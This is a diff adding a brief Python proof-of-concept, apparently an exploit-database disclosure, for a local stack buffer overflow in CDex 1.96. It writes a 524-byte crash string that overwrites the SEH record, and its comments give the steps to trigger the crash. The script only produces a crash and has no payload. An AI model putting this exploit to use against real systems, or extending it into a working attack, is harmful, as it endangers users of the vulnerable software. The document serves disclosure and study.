@@ -1,0 +1,27 @@
+#!/usr/bin/python
+ 
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: CDex 1.96  - Local Stack Buffer Overflow
+# Date: 17-12-2017
+# Vulnerable Software: CDex 1.96 (Unicode Build)
+# Vendor Homepage: http://cdex.mu/
+# Version: v1.96
+# Software Link: http://cdex.mu/?q=download
+# Tested On: Windows 7 x32
+#
+#
+# PoC: generate crash.txt, open app, go to options, settings, encoding, tags, paste crash.txt contents in picture text
+#
+# app crashes; 00420042 Pointer to next SEH record; no unicode ppr pointers
+#
+
+
+file="crash.txt"
+
+crash = "A"*520 + "B"*4  		#seh
+ 
+writeFile = open (file, "w")
+writeFile.write( crash )
+writeFile.close()
